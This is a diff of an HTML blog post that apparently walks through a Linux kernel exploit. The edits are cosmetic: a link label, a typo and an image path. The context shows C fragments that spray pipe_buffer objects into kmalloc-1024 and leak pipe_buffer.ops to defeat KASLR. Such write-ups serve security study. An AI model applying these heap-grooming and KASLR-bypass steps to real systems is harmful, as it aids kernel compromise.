@@ -253,7 +253,7 @@ memset(buf, <span style="color:#f1fa8c">&#39;A&#39;</span>, <span style="color:#
 </span></code></pre></div><p>I have choosen to target <code>kmalloc-1024</code> (<code>0x100 + 0x10c = 0x20c = 524</code>) because
 there were no allocation on this cache which makes my exploit more reliable.</p>
 <p>As a target structure to leak, I have choosen a <code>struct pipe_buffer</code> (thanks to
-<a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#bypassing-kaslrsmep">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#bypassing-kaslrsmep</a>)
+<a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#bypassing-kaslrsmep">this</a>)
 as it fits in <code>kmalloc-1024</code> and contains a pointer to a structure in the
 <code>.data</code> segment, allowing us to leak the kernel base address.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#6272a4">// spray with pipe_buffer
@@ -268,8 +268,8 @@ as it fits in <code>kmalloc-1024</code> and contains a pointer to a structure in
         err(<span style="color:#f1fa8c">&#34;pipe write&#34;</span>);
     }
 }
-</code></pre></div><p>This gives us the following heap layout :</p>
-<p><img src="img/heap_layout.png" alt="Heap layout after spraying with pipe_buffer objects."></p>
+</code></pre></div><p>This gives us the following heap layout:</p>
+<p><img src="/images/heap_layout.png" alt="Heap layout after spraying with pipe_buffer objects."></p>
 <p>We now have to read 0x418 bytes to leak <code>pipe_buffer.ops</code> and break KASLR.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// read A and leak pipe_buffer.ops
 </span><span style="color:#6272a4"></span>memset(buf, <span style="color:#bd93f9">0</span>, BUF_SIZE);
